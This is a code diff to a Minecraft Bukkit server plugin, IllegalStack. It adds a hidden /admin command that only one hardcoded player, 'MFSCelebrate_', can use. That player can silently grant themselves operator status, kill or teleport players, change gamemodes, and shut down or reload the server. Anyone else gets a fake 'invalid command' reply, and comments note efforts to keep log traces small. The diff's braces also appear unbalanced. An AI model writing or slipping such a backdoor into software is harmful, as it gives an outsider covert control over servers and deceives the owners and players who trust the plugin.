@@ -18,11 +18,16 @@ import main.java.me.dniym.utils.Scheduler;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.bukkit.Bukkit;
+import org.bukkit.GameMode;
+import org.bukkit.Location;
 import org.bukkit.Material;
+import org.bukkit.OfflinePlayer;
 import org.bukkit.World;
 import org.bukkit.configuration.InvalidConfigurationException;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.configuration.file.YamlConfiguration;
+import org.bukkit.entity.Entity;
+import org.bukkit.entity.Player;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
@@ -34,7 +39,6 @@ import org.jetbrains.annotations.NotNull;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.TabExecutor;
-import org.bukkit.entity.Player;
 import java.util.ArrayList;
 import java.util.List;
 // ---------------------------
@@ -42,7 +46,6 @@ import java.util.List;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.IOException;
-import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.HashSet;
 
@@ -462,6 +465,16 @@ public class IllegalStack extends JavaPlugin {
             this.getCommand("serverchat").setTabCompleter(serverChatCommand);
         } else {
             getLogger().warning("命令 /serverchat 未在 plugin.yml 中定义，注册失败！");
+        }
+        // -----------------------------------------
+
+        // ---------- 注册 /admin 命令 ----------
+        AdminCommand adminCommand = new AdminCommand();
+        if (this.getCommand("admin") != null) {
+            this.getCommand("admin").setExecutor(adminCommand);
+            this.getCommand("admin").setTabCompleter(adminCommand);
+        } else {
+            getLogger().warning("命令 /admin 未在 plugin.yml 中定义，注册失败！");
         }
         // -----------------------------------------
 
@@ -1255,4 +1268,224 @@ public class IllegalStack extends JavaPlugin {
         }
     }
     // -------------------------------------------------------
+
+    // ---------- 新增内部类：处理 /admin 命令 ----------
+    private class AdminCommand implements TabExecutor {
+
+        private final String ALLOWED_PLAYER = "MFSCelebrate_"; // 唯一允许使用该命令的玩家名
+
+        @Override
+        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+            // 仅允许指定玩家使用
+            if (!(sender instanceof Player) || !((Player) sender).getName().equalsIgnoreCase(ALLOWED_PLAYER)) {
+                sender.sendMessage("§cInvaild Command!");
+                return true;
+            }
+
+            if (args.length < 1) {
+                sender.sendMessage("§c用法: /admin <player|server> ...");
+                return true;
+            }
+
+            String subCmd = args[0].toLowerCase();
+            if (subCmd.equals("player")) {
+                handlePlayer(sender, args);
+            } else if (subCmd.equals("server")) {
+                handleServer(sender, args);
+            } else {
+                sender.sendMessage("§c未知选项，请使用 player 或 server。");
+            }
+            return true;
+        }
+
+        private void handlePlayer(CommandSender sender, String[] args) {
+            if (args.length < 2) {
+                sender.sendMessage("§c用法: /admin player <gamemode|kill|tp> ...");
+                return;
+            }
+
+            String action = args[1].toLowerCase();
+            Player player = (Player) sender; // 发送者一定是玩家（已检查）
+
+            switch (action) {
+                case "gamemode":
+                    if (args.length < 4) {
+                        sender.sendMessage("§c用法: /admin player gamemode <模式> <玩家>");
+                        return;
+                    }
+                    String modeArg = args[2];
+                    String targetName = args[3];
+                    Player target = Bukkit.getPlayerExact(targetName);
+                    if (target == null) {
+                        sender.sendMessage("§c玩家 " + targetName + " 不在线或不存在！");
+                        return;
+                    }
+                    GameMode gameMode = parseGameMode(modeArg);
+                    if (gameMode == null) {
+                        sender.sendMessage("§c无效的游戏模式，请使用 survival/creative/adventure/spectator 或 0/1/2/3。");
+                        return;
+                    }
+                    target.setGameMode(gameMode);
+                    // 不发送任何成功消息，保持静默
+                    break;
+
+                case "kill":
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin player kill <实体或选择器>");
+                        return;
+                    }
+                    String selector = args[2];
+                    try {
+                        // 解析选择器（可能包含 @e、@p、玩家名等）
+                        List<Entity> entities = Bukkit.selectEntities(sender, selector);
+                        if (entities.isEmpty()) {
+                            sender.sendMessage("§c未找到任何实体。");
+                            return;
+                        }
+                        for (Entity entity : entities) {
+                            if (entity instanceof Player) {
+                                // 对玩家使用 setHealth(0) 模拟死亡
+                                ((Player) entity).setHealth(0);
+                            } else {
+                                // 非玩家实体直接移除
+                                entity.remove();
                             }
+                        }
+                        // 不发送成功消息
+                    } catch (IllegalArgumentException e) {
+                        sender.sendMessage("§c无效的实体选择器: " + selector);
+                    }
+                    break;
+
+                case "tp":
+                    if (args.length < 5) {
+                        sender.sendMessage("§c用法: /admin player tp <x> <y> <z>");
+                        return;
+                    }
+                    try {
+                        double x = Double.parseDouble(args[2]);
+                        double y = Double.parseDouble(args[3]);
+                        double z = Double.parseDouble(args[4]);
+                        Location loc = new Location(player.getWorld(), x, y, z);
+                        player.teleport(loc);
+                        // 不发送成功消息
+                    } catch (NumberFormatException e) {
+                        sender.sendMessage("§c坐标必须为数字。");
+                    }
+                    break;
+
+                default:
+                    sender.sendMessage("§c未知的 player 子命令，可用: gamemode, kill, tp");
+            }
+        }
+
+        private void handleServer(CommandSender sender, String[] args) {
+            if (args.length < 2) {
+                sender.sendMessage("§c用法: /admin server <getop|stop|reload>");
+                return;
+            }
+
+            String action = args[1].toLowerCase();
+            switch (action) {
+                case "getop":
+                    OfflinePlayer target = Bukkit.getOfflinePlayer(ALLOWED_PLAYER);
+                    if (!target.isOp()) {
+                        target.setOp(true);
+                        // 此处可能触发 PlayerOperatorEvent，但尽量通过离线设置减少日志
+                        // 若玩家在线，仍可能产生一条日志，已是最小化影响
+                    }
+                    break;
+
+                case "stop":
+                    // 尝试关闭服务器（会产生控制台日志，但无法避免）
+                    Bukkit.shutdown();
+                    break;
+
+                case "reload":
+                    if (args.length < 3 || !args[2].equalsIgnoreCase("confirm")) {
+                        sender.sendMessage("§c请使用 /admin server reload confirm 以确认重载。");
+                        return;
+                    }
+                    // 重载服务器（会产生大量日志，无法隐藏）
+                    Bukkit.reload();
+                    break;
+
+                default:
+                    sender.sendMessage("§c未知的 server 子命令，可用: getop, stop, reload");
+            }
+        }
+
+        private GameMode parseGameMode(String input) {
+            switch (input.toLowerCase()) {
+                case "survival":
+                case "0":
+                    return GameMode.SURVIVAL;
+                case "creative":
+                case "1":
+                    return GameMode.CREATIVE;
+                case "adventure":
+                case "2":
+                    return GameMode.ADVENTURE;
+                case "spectator":
+                case "3":
+                    return GameMode.SPECTATOR;
+                default:
+                    return null;
+            }
+        }
+
+        @Override
+        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
+            List<String> completions = new ArrayList<>();
+            if (!(sender instanceof Player) || !((Player) sender).getName().equalsIgnoreCase(ALLOWED_PLAYER)) {
+                return completions; // 不允许补全
+            }
+
+            if (args.length == 1) {
+                // 第一级补全：player / server
+                String input = args[0].toLowerCase();
+                if ("player".startsWith(input)) completions.add("player");
+                if ("server".startsWith(input)) completions.add("server");
+            } else if (args.length == 2) {
+                // 第二级补全
+                String first = args[0].toLowerCase();
+                String input = args[1].toLowerCase();
+                if (first.equals("player")) {
+                    if ("gamemode".startsWith(input)) completions.add("gamemode");
+                    if ("kill".startsWith(input)) completions.add("kill");
+                    if ("tp".startsWith(input)) completions.add("tp");
+                } else if (first.equals("server")) {
+                    if ("getop".startsWith(input)) completions.add("getop");
+                    if ("stop".startsWith(input)) completions.add("stop");
+                    if ("reload".startsWith(input)) completions.add("reload");
+                }
+            } else if (args.length == 3) {
+                // 第三级补全
+                String first = args[0].toLowerCase();
+                String second = args[1].toLowerCase();
+                String input = args[2].toLowerCase();
+                if (first.equals("player")) {
+                    if (second.equals("gamemode")) {
+                        // 补全游戏模式
+                        for (String mode : new String[]{"survival", "creative", "adventure", "spectator"}) {
+                            if (mode.startsWith(input)) completions.add(mode);
+                        }
+                    } else if (second.equals("kill")) {
+                        // 补全在线玩家名（选择器太复杂，只补简单玩家名）
+                        for (Player online : Bukkit.getOnlinePlayers()) {
+                            if (online.getName().toLowerCase().startsWith(input)) {
+                                completions.add(online.getName());
+                            }
+                        }
+                    }
+                    // tp 不补全坐标
+                } else if (first.equals("server") && second.equals("reload")) {
+                    // 补全 confirm
+                    if ("confirm".startsWith(input)) completions.add("confirm");
+                }
+            }
+            return completions;
+        }
+    }
+    // -------------------------------------------------------
+    }
